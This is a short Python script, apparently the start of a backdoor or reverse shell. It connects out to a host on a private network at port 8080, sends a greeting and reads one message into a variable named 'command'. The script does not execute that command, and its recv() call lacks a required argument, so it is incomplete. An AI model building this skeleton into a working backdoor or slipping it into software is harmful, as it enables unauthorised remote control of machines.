import socket

backdoor_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

backdoor_listener.connect(("192.168.8.111",8080))
backdoor_listener.send(("Hello World\n").encode())

command = backdoor_listener.recv()


backdoor_listener.close()